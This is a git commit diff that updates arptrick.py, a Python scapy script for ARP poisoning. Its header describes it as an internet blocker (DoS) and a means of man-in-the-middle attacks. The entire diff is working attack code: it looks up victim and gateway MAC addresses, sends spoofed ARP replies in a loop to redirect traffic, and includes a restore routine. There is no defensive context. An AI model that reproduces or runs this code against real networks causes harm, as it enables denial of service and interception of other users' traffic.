495f7cb9b32aefe13e9c5022126ff3d5429a8fbd
s33r <acow777@gmail.com>
2018-12-31 21:49:41 -0800

    starting stego and tcp reset tools

--- arptrick.py
+++ arptrick.py
@@ -1,44 +1,64 @@
+'''
+Arp Poisoning in Python 3
+
+> acts as an effective internet blocker(DOS) without ip forwarding enabled 
+> can be used as a means of man in the middle attacks 
+
+!!!TODO:!!!
+> Add packet filtering functionality to edit packet strings with regex
+> Test as compiled binary on Mac, Linux, and Windows
+
+enjoy
+'''
+
 import os
 import signal
 import sys
 import time
-from multiprocessing import Process
 
 from scapy.all import *
 
+import config as cfg
 
-def proc_info(title):
-    print title
-    print 'module name:', __name__
-    if hasattr(os, 'getppid'):  # only available on Unix
-        print 'parent process:', os.getppid()
-    print 'process id:', os.getpid()
+# Edit config.py to set interface
+interface = cfg.interface
 
-def get_mac(IP):
-    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
+def get_mac(ip):
+    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, iface = interface, inter = 0.1, verbose=0)
     for snd,rcv in ans:
         return rcv.sprintf(r"%Ether.src%")
 
-def arp_poison(gateway_ip, gateway_mac, victim_ip, victim_mac):
-    print("\n[*] Starting the Arp Poison...")
-    while 1:
-        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip))
-        send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip))
-        time.sleep(5)
+def arp_poison(victim_ip, victim_mac, gateway_ip, gateway_mac):
+    print("\n[*] Starting Arp Poison...")
+    while True:
+        try:
+            # scapy arp poison
+            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip), verbose=0)
+            send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip), verbose=0)
+            time.sleep(5)
+        except KeyboardInterrupt:
+            # clean exit when keyboard interrupt is sent
+            print("\n[*] Stopping Arp Poison...")
+            re_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)
 
-def reARP():
-    print "\n[*] Restoring Targets..."
-    victimMAC = get_mac(victimIP)
-    gatewayMAC = get_mac(gatewayIP)
-    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
-    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatewayMAC), count = 7)
-        disable_ip_forwarding()
+def re_arp(victim_ip, victim_mac, gateway_ip, gateway_mac):
+    print("\n[*] Restoring Targets...")
+    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victim_mac), count = 7)
+    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 7)
     sys.exit(1)
 
+def clean_exit(sig, frame):
+    print('You pressed Ctrl+C!')
+    
 if __name__ == '__main__':
-    p = Process(target=arp_poison, args=(gateway_ip, gateway_mac, victim_ip, victim_mac,))
-    p.start()
-    p.join()
+    victim_ip = sys.argv[1]
+    victim_mac = get_mac(victim_ip)
+    gateway_ip = sys.argv[2]
+    gateway_mac = get_mac(gateway_ip)
 
+    print("victim mac:", victim_mac)
+    print("gateway mac:", gateway_mac)
+
+    arp_poison(victim_ip, victim_mac, gateway_ip, gateway_mac)
 
 
